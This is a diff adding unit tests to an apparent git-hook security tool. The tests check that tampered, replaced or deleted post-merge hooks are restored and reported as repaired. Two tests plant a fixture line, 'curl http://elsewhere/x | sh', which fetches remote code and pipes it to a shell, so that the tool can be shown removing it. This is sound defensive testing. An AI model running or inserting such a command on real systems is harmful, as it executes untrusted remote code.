@@ -1463,6 +1463,16 @@ class TestItPutsTheHooksInPlaceToo(unittest.TestCase):
         self.assertNotIn("will be scanned", text)
         self.assertNotIn("hook install", text)
 
+    def test_a_hook_that_was_tampered_with_is_repaired_and_said_so(self):
+        # Leaving an unchanged hook alone must not mean leaving a changed one alone. A hook that
+        # was altered under the operator is something that happened TO their machine, and it reads
+        # differently from a first install.
+        code, text = self._run(hook.Settling(
+            actions=[self._Action(hook.IN_PLACE), self._Action(hook.QUARANTINED)], target="/t"))
+        self.assertEqual(code, 0)
+        self.assertIn("had been changed", text)
+        self.assertNotIn("will be scanned", text, "a repair read as a routine install")
+
     def test_hooks_that_could_not_be_put_in_place_are_not_a_silent_pass(self):
         code, text = self._run(hook.Settling(problem="git refused", code=2))
         self.assertEqual(code, 3)
@@ -1517,6 +1527,40 @@ class TestSettlingTheHooksIsRepeatable(unittest.TestCase):
             self.assertIsNone(done.problem, f"run {again} failed: {done.problem}")
             self.assertTrue(done.settled, f"run {again} did not settle")
             self.assertFalse(done.changed, f"run {again} rewrote hooks that were already in place")
+
+    def test_a_hook_replaced_with_something_else_is_put_back(self):
+        from stayawake.bots.security import hookscript
+        hook.settle_hooks()
+        victim = hookscript.template_dir() / "hooks" / "post-merge"
+        saws = victim.read_text()
+        victim.write_text("#!/bin/sh\nexec curl http://elsewhere/x | sh\n")
+
+        done = hook.settle_hooks()
+        self.assertTrue(done.repaired, "a replaced hook was not reported as repaired")
+        self.assertEqual(victim.read_text(), saws, "saw's own hook was not put back")
+        self.assertNotIn("elsewhere", victim.read_text())
+
+    def test_saws_own_hook_with_a_line_added_to_it_is_put_back(self):
+        # Distinct from replacing it: this one still looks like saw's hook, and it is the shape an
+        # attacker who wants the hook to keep working would use.
+        from stayawake.bots.security import hookscript
+        hook.settle_hooks()
+        victim = hookscript.template_dir() / "hooks" / "post-merge"
+        saws = victim.read_text()
+        victim.write_text(saws + "\ncurl http://elsewhere/x | sh\n")
+
+        done = hook.settle_hooks()
+        self.assertTrue(done.repaired, "an altered hook was not reported as repaired")
+        self.assertEqual(victim.read_text(), saws, "saw's own hook was not put back")
+        self.assertNotIn("elsewhere", victim.read_text())
+
+    def test_a_deleted_hook_is_put_back(self):
+        from stayawake.bots.security import hookscript
+        hook.settle_hooks()
+        victim = hookscript.template_dir() / "hooks" / "post-merge"
+        victim.unlink()
+        hook.settle_hooks()
+        self.assertTrue(victim.exists(), "a deleted hook was not restored")
 
     def test_the_second_settling_reports_no_change(self):
         hook.settle_hooks()
